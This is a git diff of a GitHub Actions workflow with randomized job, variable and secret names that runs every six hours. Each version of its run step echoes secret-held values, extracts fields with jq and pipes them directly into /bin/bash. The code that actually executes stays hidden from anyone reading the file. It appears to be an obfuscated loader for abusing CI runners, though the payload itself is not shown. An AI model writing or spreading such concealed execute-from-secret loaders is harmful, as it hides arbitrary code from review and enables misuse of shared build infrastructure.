@@ -1,8 +1,9 @@
 name: xiezijian7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '14 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiezijian7654
         env:
-          s2477: ${{ secrets.s2477 }}
+          ncno57130: ${{ secrets.ncno57130 }}
         run: |
-          echo $s2477 | jq -r .o112 | /bin/bash
-          echo $gjm4262 | jq -r .kbenf5272 | /bin/bash
-          echo $nvgvo9576 | jq -r .xqjqo40544 | /bin/bash
-          echo $sqld3 | jq -r .qk5641 | /bin/bash
-          echo $bu318 | jq -r .ti76284 | /bin/bash
-          echo $tctk3 | jq -r .etem495 | /bin/bash
-          echo $tz53 | jq -r .xwz018 | /bin/bash
-          echo $ebesi9526 | jq -r .ud501 | /bin/bash
-          echo $i68247 | jq -r .cuupb78 | /bin/bash
-          echo $rxihn21840 | jq -r .sy04076 | /bin/bash
-          echo $sbu9968 | jq -r .zoq9902 | /bin/bash
-          echo $oco27 | jq -r .kon5 | /bin/bash
+          echo $ncno57130 | jq -r .gy90235 | /bin/bash
+          echo $fnuam044 | jq -r .pufo98464 | /bin/bash
+          echo $u41 | jq -r .fr3 | /bin/bash
+          echo $puzau770 | jq -r .fbw514 | /bin/bash
+          echo $hg800 | jq -r .zqx551 | /bin/bash
+          echo $oaqh0117 | jq -r .uum3393 | /bin/bash
+          echo $x9 | jq -r .jtn45 | /bin/bash
+          echo $igtn0 | jq -r .kf4112 | /bin/bash
 
